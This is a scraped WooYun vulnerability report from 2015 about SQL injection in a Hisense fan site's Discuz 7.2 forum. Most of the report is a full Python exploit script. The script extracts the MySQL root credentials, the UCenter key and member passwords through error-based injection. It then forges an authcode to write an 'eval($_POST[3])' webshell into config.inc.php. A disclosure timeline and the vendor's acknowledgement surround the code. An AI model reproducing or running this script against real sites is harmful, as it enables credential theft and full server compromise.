{"id": 33095, "wybug_id": "wooyun-2015-0109608", "wybug_title": "海信集团某站SQL注入（可GETSHELL）", "wybug_corp": "hisense.com", "wybug_author": "路人甲", "wybug_date": "2015-04-22 10:11", "wybug_open_date": "2015-06-07 10:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向公众公开  简要描述： 海信集团某站SQL注入（可GETSHELL） 详细说明：  \nhttp://fans.hisense.com/default.php     dz7.2 faq.php注入\nEXP:\n#!/usr/bin/env python# -*- coding: gbk -*-# -*- coding: utf_8 -*- # author iswin import sysimport hashlibimport timeimport mathimport base64import urllib2 import urllibimport redef sendRequest(url,para):        try:                data = urllib.urlencode(para)                req=urllib2.Request(url,data)                res=urllib2.urlopen(req,timeout=20).read()        except Exception, e:                print 'Exploit Failed!\\n%s'%(e)                exit(0);        return resdef getTablePrefix(url):        print 'Start GetTablePrefix...'        para={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat((select hex(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}        res=sendRequest(url,para);        pre=re.findall(\"Duplicate entry '(.*?)'\",res);        if len(pre)==0:                print 'Exploit Failed!'                exit(0);        table_pre=pre[0][:len(pre[0])-1].decode('hex')        table_pre=table_pre[0:table_pre.index('_')]        print 'Table_pre:%s'%(table_pre)        return table_predef getCurrentUser(url):        para={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}        res=sendRequest(url,para)        pre=re.findall(\"Duplicate entry '(.*?)'\",res)        if len(pre)==0:                print 'Exploit Failed!'                exit(0);        table_pre=pre[0][:len(pre[0])-1]        print 'Current User:%s'%(table_pre)        return table_predef getUcKey(url):        para={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat((select substr(authkey,1,62) from cdb_uc_applications limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}        para1={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat((select substr(authkey,63,2) from cdb_uc_applications limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}        res=sendRequest(url,para);        res1=sendRequest(url,para1);        key1=re.findall(\"Duplicate entry '(.*?)'\",res)        key2=re.findall(\"Duplicate entry '(.*?)'\",res1)        if len(key1)==0:                print 'Get Uc_Key Failed!'                return ''        key=key1[0][:len(key1[0])-1]+key2[0][:len(key2[0])-1]        print 'uc_key:%s'%(key)        return keydef getRootUser(url):        para={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat((select concat(user,0x20,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}        res=sendRequest(url,para);        pre=re.findall(\"Duplicate entry '(.*?)'\",res)        if len(pre)==0:                print 'Exploit Failed!'                exit(0);        table_pre=pre[0][:len(pre[0])-1].split(' ')        print 'root info:\\nuser:%s password:%s'%(table_pre[0],table_pre[1])def dumpData(url,table_prefix,count):        para={'action':'grouppermission','gids[99]':'\\'','gids[100][0]':') and (select 1 from (select count(*),concat((select concat(username,0x20,password) from %s_members limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'%(table_prefix,count)}        res=sendRequest(url,para);        datas=re.findall(\"Duplicate entry '(.*?)'\",res)        if len(datas)==0:                print 'Exploit Failed!'                exit(0)        cleandata=datas[0][:len(datas[0])-1]        info=cleandata.split(' ')        print 'user:%s pass:%s'%(info[0].decode('utf-8').encode('cp936'),info[1])def microtime(get_as_float = False) :    if get_as_float:        return time.time()    else:        return '%.8f %d' % math.modf(time.time()) def get_authcode(string, key = ''):    ckey_length = 4    key = hashlib.md5(key).hexdigest()    keya = hashlib.md5(key[0:16]).hexdigest()    keyb = hashlib.md5(key[16:32]).hexdigest()    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()     key_length = len(cryptkey)    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string    string_length = len(string)    result = ''    box = range(0, 256)    rndkey = dict()    for i in range(0,256):        rndkey[i] = ord(cryptkey[i % key_length])    j=0    for i in range(0,256):        j = (j + box[i] + rndkey[i]) % 256        tmp = box[i]        box[i] = box[j]        box[j] = tmp    a=0    j=0    for i in range(0,string_length):        a = (a + 1) % 256        j = (j + box[a]) % 256        tmp = box[a]        box[a] = box[j]        box[j] = tmp        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))    return keyc + base64.b64encode(result).replace('=', '') def get_shell(url,key,host):    headers={'Accept-Language':'zh-cn',    'Content-Type':'application/x-www-form-urlencoded',    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',    'Referer':url    }    tm = time.time()+10*3600    tm=\"time=%d&action=updateapps\" %tm    code = urllib.quote(get_authcode(tm,key))    url=url+\"?code=\"+code    data1='''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>            <root>            <item id=\"UC_API\">http://xxx\\');eval($_POST[3]);//</item>            </root>'''    try:        req=urllib2.Request(url,data=data1,headers=headers)        ret=urllib2.urlopen(req)    except:        return \"Exploit Falied\"    data2='''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>            <root>            <item id=\"UC_API\">http://aaa</item>            </root>'''    try:        req=urllib2.Request(url,data=data2,headers=headers)        ret=urllib2.urlopen(req)    except:        return \"error\"    try:            req=urllib2.Request(host+'/config.inc.php')            res=urllib2.urlopen(req,timeout=20).read()    except Exception, e:            print 'GetWebshell Failed,%s'%(e)            return     print \"webshell:\"+host+\"/config.inc.php,password:3\"if __name__ == '__main__':        print 'DZ7.x Exp Code By iswin'        if len(sys.argv)<3:                print 'DZ7.x Exp Code By iswin\\nusage:python dz7.py http://www.waitalone.cn 10'                exit(0)        url=sys.argv[1]+'/faq.php'        count=int(sys.argv[2])        user=getCurrentUser(url)        if user.startswith('root@'):                getRootUser(url)        uc_key=getUcKey(url)        if len(uc_key)==64:                print 'Start GetWebshell...'                get_shell(sys.argv[1]+'/api/uc.php',uc_key,sys.argv[1])        tb_pre=getTablePrefix(url)        print 'Start DumpData...'        for x in xrange(0,count):                dumpData(url,tb_pre,x)\n   漏洞证明：  \n\n   修复方案：  ..   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-23 10:07 厂商回复： 我们会尽快修复该漏洞，非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}